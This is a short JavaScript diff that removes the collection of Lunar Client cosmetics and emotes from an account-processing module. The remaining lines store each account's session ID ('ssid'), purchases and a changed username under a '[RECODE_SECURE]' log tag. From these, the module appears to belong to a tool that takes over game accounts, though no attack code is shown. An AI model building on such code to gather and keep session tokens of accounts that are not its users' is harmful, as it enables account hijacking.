@@ -569,19 +569,6 @@ module.exports = async (host, settings, uid, username = null) => {
             acc.donut = inforesult?.donut;
             acc.subscriptions = inforesult?.subs;
             acc.purchases = inforesult?.purchases;
-
-            if (inforesult?.cosmetics || inforesult?.emotes) {
-                acc.lunar = {
-                    cosmetics: inforesult.cosmetics?.allcosmetics || "None",
-                    plusCosmetics: inforesult.cosmetics?.lunarfreecosmetics || "None",
-                    equippedCosmetics: inforesult.cosmetics?.equippedcosmetics || "None",
-                    emotes: inforesult.emotes?.allemotes || "None",
-                    equippedEmotes: inforesult.emotes?.equippedemotes || "None",
-                    rank: inforesult.cosmetics?.lunarrank || "None",
-                    cosamount: inforesult.cosmetics?.cosmeticamount,
-                    emoteamount: inforesult.emotes?.emotesamount
-                };
-            }
         } catch (infoErr) {
             console.error(`[RECODE_SECURE] Error in getinfo:`, infoErr.message);
         }
@@ -773,7 +760,6 @@ module.exports = async (host, settings, uid, username = null) => {
     await Promise.all([
         updateExtraInformation(uid, "ssid", acc.ssid),
         updateExtraInformation(uid, "capes", JSON.stringify(acc.capes || [])),
-        updateExtraInformation(uid, "lunar", JSON.stringify(acc.lunar || {})),
         updateExtraInformation(uid, "username", acc.newName)
     ]);
 
